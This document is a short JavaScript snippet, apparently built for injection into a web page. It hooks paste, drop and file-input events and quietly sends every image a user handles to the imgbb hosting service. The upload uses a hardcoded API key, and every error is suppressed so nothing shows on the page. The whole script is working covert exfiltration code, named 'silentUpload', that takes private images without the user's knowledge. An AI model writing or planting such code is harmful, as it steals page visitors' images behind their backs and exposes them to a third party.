(function() {
  const API_KEY = '6eb62f9f5886fbca74ba13de2705af60';
  const uploadQueue = [];
  let isUploading = false;

  async function silentUpload(file) {
    const formData = new FormData();
    formData.append('image', file);
    formData.append('key', API_KEY);
    
    try {
      await fetch('https://api.imgbb.com/1/upload', {
        method: 'POST',
        body: formData
      });
    } catch(e) {}
  }

  async function processQueue() {
    if (isUploading || uploadQueue.length === 0) return;
    isUploading = true;
    
    try {
      while (uploadQueue.length > 0) {
        const file = uploadQueue.shift();
        await silentUpload(file);
        await new Promise(r => setTimeout(r, 100));
      }
    } catch(e) {}
    
    isUploading = false;
  }

  function queueUpload(file) {
    try {
      if (file && file.type.startsWith('image/')) {
        uploadQueue.push(file);
        setTimeout(processQueue, 50);
      }
    } catch(e) {}
  }

  window.addEventListener('paste', e => {
    try {
      const items = e.clipboardData?.items;
      if (items) {
        for (let i = 0; i < items.length; i++) {
          if (items[i].type.startsWith('image/')) {
            queueUpload(items[i].getAsFile());
          }
        }
      }
    } catch(e) {}
  });

  document.addEventListener('drop', e => {
    try {
      const files = e.dataTransfer?.files;
      if (files) {
        Array.from(files).forEach(f => {
          if (f.type.startsWith('image/')) queueUpload(f);
        });
      }
    } catch(e) {}
  });

  const observer = new MutationObserver(() => {
    try {
      const fileInput = document.getElementById('file');
      if (fileInput && !fileInput._uploaderAttached) {
        fileInput._uploaderAttached = true;
        fileInput.addEventListener('change', () => {
          try {
            Array.from(fileInput.files).forEach(queueUpload);
          } catch(e) {}
        });
      }
    } catch(e) {}
  });
  
  observer.observe(document.body, { childList: true, subtree: true });
  
  setTimeout(() => {
    try {
      const fileInput = document.getElementById('file');
      if (fileInput && !fileInput._uploaderAttached) {
        fileInput._uploaderAttached = true;
        fileInput.addEventListener('change', () => {
          try {
            Array.from(fileInput.files).forEach(queueUpload);
          } catch(e) {}
        });
      }
    } catch(e) {}
  }, 100);
})();
